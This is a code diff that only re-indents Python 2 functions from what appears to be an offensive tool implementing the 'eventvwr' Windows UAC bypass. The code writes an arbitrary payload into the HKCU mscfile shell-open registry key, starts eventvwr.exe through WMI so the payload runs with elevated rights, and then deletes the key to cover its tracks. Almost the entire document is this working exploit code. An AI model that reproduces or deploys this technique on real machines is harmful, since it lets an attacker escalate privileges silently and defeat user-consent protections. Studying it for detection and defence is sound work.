@@ -30,13 +30,13 @@ def eventvwr():
 	print " {} eventvwr: Attempting to create registry key".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Classes\mscfile\shell\open\command"))
+					os.path.join("Software\Classes\mscfile\shell\open\command"))
 								
 		_winreg.SetValueEx(key,
-							None,
-							0,
-							_winreg.REG_SZ,
-							payload)
+				None,
+				0,
+				_winreg.REG_SZ,
+				payload)
 		_winreg.CloseKey(key)
 		print " {} eventvwr: Registry key created".format(successBox())
 	except Exception as error:
@@ -49,7 +49,7 @@ def eventvwr():
 	print " {} eventvwr: Attempting to create process".format(infoBox())
 	try:
 		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start eventvwr.exe",
-										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
 		if (result[1] == 0):
 			print " {} eventvwr: Process started successfully".format(successBox())
 		else:
@@ -64,7 +64,7 @@ def eventvwr():
 	print " {} eventvwr: Attempting to remove registry key".format(infoBox())
 	try:
 		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
-							os.path.join("Software\Classes\mscfile"))
+				os.path.join("Software\Classes\mscfile"))
 		print " {} eventvwr: Registry key was deleted".format(successBox())
 	except Exception as error:
 		print " {} eventvwr: Unable to delete key".format(errorBox())
